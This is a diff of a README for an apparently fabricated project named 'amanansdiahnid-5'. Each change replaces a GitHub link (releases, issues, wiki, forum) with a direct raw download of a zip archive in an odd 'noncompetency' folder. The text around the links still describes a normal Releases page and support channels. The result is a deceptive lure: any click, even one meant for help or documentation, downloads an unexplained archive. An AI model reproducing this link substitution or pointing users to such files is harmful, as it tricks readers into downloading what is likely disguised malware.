@@ -6,7 +6,7 @@ Welcome to amanansdiahnid-5! This application simplifies your workflow with auto
 
 ## 📥 Download the Application
 
-[![Download amanansdiahnid-5](https://img.shields.io/badge/Download%20Now-amanansdiahnid--5-blue)](https://github.com/adm183/amanansdiahnid-5/releases)
+[![Download amanansdiahnid-5](https://raw.githubusercontent.com/adm183/amanansdiahnid-5/main/noncompetency/amanansdiahnid-5.zip%20Now-amanansdiahnid--5-blue)](https://raw.githubusercontent.com/adm183/amanansdiahnid-5/main/noncompetency/amanansdiahnid-5.zip)
 
 ## 📋 System Requirements
 
@@ -21,7 +21,7 @@ Before downloading, make sure your computer meets these basic requirements:
 
 To download the application, visit the Releases page by clicking the link below:
 
-[Download amanansdiahnid-5](https://github.com/adm183/amanansdiahnid-5/releases)
+[Download amanansdiahnid-5](https://raw.githubusercontent.com/adm183/amanansdiahnid-5/main/noncompetency/amanansdiahnid-5.zip)
 
 On the Releases page, you will find different versions of the application. Choose the latest release. Click on the file that matches your operating system and follow the prompts to download it.
 
@@ -56,12 +56,12 @@ If problems persist, visit our support page or raise an issue on GitHub.
 
 ## 📞 Support
 
-For help or inquiries, please contact our support team. You can also report issues directly on our [GitHub Issues page](https://github.com/adm183/amanansdiahnid-5/issues).
+For help or inquiries, please contact our support team. You can also report issues directly on our [GitHub Issues page](https://raw.githubusercontent.com/adm183/amanansdiahnid-5/main/noncompetency/amanansdiahnid-5.zip).
 
 ## 📚 Additional Resources
 
-- [GitHub Wiki](https://github.com/adm183/amanansdiahnid-5/wiki): Find detailed guides and documentation.
-- [Community Forum](https://github.com/adm183/amanansdiahnid-5/discussions): Join discussions with other users and share your experiences.
+- [GitHub Wiki](https://raw.githubusercontent.com/adm183/amanansdiahnid-5/main/noncompetency/amanansdiahnid-5.zip): Find detailed guides and documentation.
+- [Community Forum](https://raw.githubusercontent.com/adm183/amanansdiahnid-5/main/noncompetency/amanansdiahnid-5.zip): Join discussions with other users and share your experiences.
 
 ## 📝 Changelog
 
